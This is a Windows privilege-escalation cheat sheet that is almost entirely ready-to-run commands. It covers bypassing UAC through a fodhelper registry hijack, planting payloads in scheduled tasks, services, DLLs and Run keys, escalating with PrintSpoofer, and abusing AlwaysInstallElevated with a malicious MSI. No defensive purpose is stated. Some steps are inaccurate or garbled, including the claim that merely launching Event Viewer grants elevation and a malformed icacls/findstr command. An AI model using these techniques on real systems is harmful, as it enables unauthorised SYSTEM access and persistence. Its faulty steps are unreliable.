# User Account Control (UAC) Bypass

#### Check UAC Status
- To determine if UAC is enabled:
    ```cmd
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
    ```
    - `EnableLUA`: 1 = UAC enabled, 0 = UAC disabled.
    
- To check the consent prompt behavior:
    ```cmd
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
    ```

#### Bypass UAC via `eventvwr.exe`
1. Launch Event Viewer:
    ```cmd
    eventvwr
    ```
2. Event Viewer runs with elevated privileges. From here, launch a command prompt or PowerShell with elevated privileges.

#### Bypass UAC via `fodhelper.exe`
1. Add a registry key to hijack the flow:
    ```cmd
    reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
    reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
    ```
2. Execute `fodhelper.exe` to open a command prompt with elevated privileges:
    ```cmd
    fodhelper.exe
    ```

# Scheduled Task Exploitation

#### Create a Scheduled Task
- Create a task that runs with SYSTEM privileges:
    ```cmd
    schtasks /create /tn "<TaskName>" /tr "cmd.exe /c <command>" /sc onlogon /ru system
    ```

#### Modify an Existing Task
- Modify a task to run with a malicious payload:
    ```cmd
    schtasks /change /tn "<TaskName>" /tr "C:\path\to\malicious.exe"
    ```

#### List All Scheduled Tasks
- View all scheduled tasks and their detailed information:
    ```cmd
    schtasks /query /fo LIST /v
    ```

#### Exploit Writable Scheduled Tasks
1. Find tasks with writable permissions:
    ```cmd
    icacls "C:\Windows\System32\Tasks\<TaskName>"
    ```
2. If writable, modify the task’s executable path to point to a malicious executable:
    ```cmd
    schtasks /change /tn "<TaskName>" /tr "cmd.exe /c <malicious_script>"
    ```

# Service Exploitation

#### List Services and Their Executables
- Show services and their associated executables:
    ```cmd
    wmic service get name,pathname,displayname,startmode
    ```

#### Unquoted Service Path Exploitation
1. Check for unquoted service paths:
    ```cmd
    wmic service get name,displayname,pathname,startmode | findstr /i "C:\Program Files" | findstr /v """
    ```

2. If unquoted and vulnerable, place a malicious executable in the path with the same name as the first part of the directory.

#### Exploit Writable Service Executables
1. Check permissions of service executables:
    ```cmd
    icacls "<Path\To\ServiceExecutable>"
    ```
2. If writable, replace it with a malicious executable.

# DLL Hijacking

#### Search for DLL Hijacking Opportunities
1. Identify DLLs loaded by services or applications:
    ```cmd
    tasklist /m
    ```
2. Check if any loaded DLLs are in writable directories, using:
    ```cmd
    icacls "<Path\To\DLL>"
    ```

#### Exploit DLL Hijacking
- Replace a writable DLL with a malicious one, and restart the service or application that loads it.

# Token Manipulation

#### List Privileges
- Check current user privileges:
    ```cmd
    whoami /priv
    ```

#### Exploit SeImpersonatePrivilege
- If SeImpersonatePrivilege is available, use a tool like PrintSpoofer to escalate to SYSTEM:
    ```cmd
    PrintSpoofer.exe -i -c cmd
    ```

# Registry Exploitation

#### Autorun Program via Registry
1. Add a malicious executable to the startup registry:
    ```cmd
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <MaliciousKey> /t REG_SZ /d "C:\path\to\malicious.exe" /f
    ```

#### Abusing AlwaysInstallElevated
1. Check if AlwaysInstallElevated is enabled:
    ```cmd
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```

2. Exploit AlwaysInstallElevated by creating a malicious MSI:
    ```cmd
    msiexec /quiet /qn /i C:\path\to\malicious.msi
    ```

# File System Exploitation

#### Search for Writable Files
- Find all writable files and directories:
    ```cmd
    icacls C:\ /findstr /i "Everyone:(F)"
    ```

#### Modify Writable Files for Privilege Escalation
- Replace a writable file or script with a malicious executable or script:
    ```cmd
    echo "malicious code" > C:\path\to\writable_file.bat
    ```
